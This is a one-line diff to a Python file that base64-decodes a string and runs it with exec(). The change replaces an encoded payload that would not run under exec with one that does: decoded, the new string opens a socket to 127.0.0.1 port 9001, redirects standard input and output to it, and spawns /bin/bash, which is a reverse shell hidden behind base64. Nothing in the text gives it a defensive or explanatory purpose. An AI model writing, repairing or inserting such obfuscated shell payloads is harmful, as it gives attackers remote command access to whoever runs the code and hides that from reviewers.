@@ -1,1 +1,1 @@
-import base64;tmp = 'cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMTI3LjAuMC4xIiw5MDAxKSk7W29zLmR1cDIocy5maWxlbm8oKSxmKWZvciBmIGluKDAsMSwyKV07cHR5LnNwYXduKCIvYmluL2Jhc2giKSc=';code = exec(base64.b64decode(tmp))
+import base64;tmp = 'aW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMTI3LjAuMC4xIiw5MDAxKSk7W29zLmR1cDIocy5maWxlbm8oKSxmKWZvciBmIGluKDAsMSwyKV07cHR5LnNwYXduKCIvYmluL2Jhc2giKQ==';code = exec(base64.b64decode(tmp))
